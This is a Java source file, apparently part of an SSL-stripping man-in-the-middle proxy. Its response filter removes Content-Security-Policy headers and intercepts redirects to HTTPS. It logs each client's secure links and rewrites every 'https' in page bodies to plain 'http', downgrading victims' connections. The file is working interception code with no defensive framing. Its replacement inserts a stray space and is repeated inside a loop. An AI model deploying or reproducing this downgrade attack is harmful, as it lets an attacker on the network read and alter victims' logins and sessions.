

package mitm;

import java.io.PrintWriter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ResponseFilter implements IDataFilter
{
  public interface OnRedirectInterceptListener
  {
    public void onRedirectIntercepted(HttpMessage message);
  }
  
  private PrintWriter m_out = new PrintWriter(System.out, true);
  private Pattern m_serverRedirectPattern;
  private Pattern m_httpsPattern;
  private OnRedirectInterceptListener m_redirectListener;

  public ResponseFilter(OnRedirectInterceptListener listener)
  {
    m_redirectListener = listener;
    m_serverRedirectPattern = Pattern.compile("^HTTP.* (30\\d).*");
    m_httpsPattern = Pattern.compile("(https://[^\\s]+)");
  }
  
  public void setOutputPrintWriter(PrintWriter outputPrintWriter)
  {
    m_out.flush();
    m_out = outputPrintWriter;
  }

  public PrintWriter getOutputPrintWriter()
  {
    return m_out;
  }

  @Override
  public HttpMessage handle(ConnectionDetails connectionDetails, HttpMessage message) throws Exception
  {    
    Matcher redirectMatcher = m_serverRedirectPattern.matcher(message.getTopLine());
    Matcher httpsMatcher = m_httpsPattern.matcher(message.getBodyAsString());

    Strippers.removeAcceptEncoding(message);
    Strippers.removeContentSecurityPolicy(message);
    
    System.err.println("------ " + connectionDetails.getDescription() + " ------");
    System.out.println(message.getHeadersAsString());
    
    if (redirectMatcher.find())
    {
      // Intercept redirects
      int statusCode = Integer.parseInt(redirectMatcher.group(1));
      
      if (statusCode == 301 || statusCode == 302)
      {
        String location = message.get("Location").get(0);
        
        if (location.startsWith("https"))
        { 
          System.err.println("-- Intecepted redirect: "
              + redirectMatcher.group() + " for " + location);
          
          m_redirectListener.onRedirectIntercepted(message);
    
          // Avoid closing the client connection by returning a null
          return null;
        }
      }
    }
    
    UrlMonitor urlMonitor = UrlMonitor.getInstance();
    String client = connectionDetails.getLocalHost();
    
    while(httpsMatcher.find())
    {
      // Down-grade links
      String url = httpsMatcher.group();
      urlMonitor.addSecureLink(client, url);

      String stripped = message.getBodyAsString().replace("https", " http");
      message.setBodyBytes(stripped.getBytes("UTF-8"));
    }
    
    return message;
  }
  
  public void connectionOpened(ConnectionDetails connectionDetails)
  {
    System.err.println("--- " + connectionDetails.getDescription()
        + " opened --");
  }

  public void connectionClosed(ConnectionDetails connectionDetails)
  {
    System.err.println("--- " + connectionDetails.getDescription()
        + " closed --");
  }
}
